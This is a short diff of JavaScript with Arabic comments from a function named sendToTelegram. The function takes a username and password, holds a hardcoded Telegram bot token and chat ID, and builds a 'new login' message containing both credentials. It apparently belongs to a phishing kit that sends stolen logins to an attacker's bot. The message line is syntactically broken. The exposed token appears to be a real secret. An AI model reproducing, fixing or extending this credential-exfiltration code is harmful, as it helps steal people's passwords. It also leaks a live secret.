@@ -17,6 +17,7 @@ function sendToTelegram(username, password) {
   var botToken = "7664974744:AAG0ueJAEKAs7d8e2Yr48MifjmEBm093bV8";  // ضع توكن البوت هنا
   var chatId = "7643313499";      // ضع chat_id هنا
 
+  // التأكد من وضع النص بين علامات اقتباس
   var message = تم تسجيل دخول جديد:\nاسم المستخدم: ${username}\nكلمة المرور: ${password};
   
   // بناء الرابط
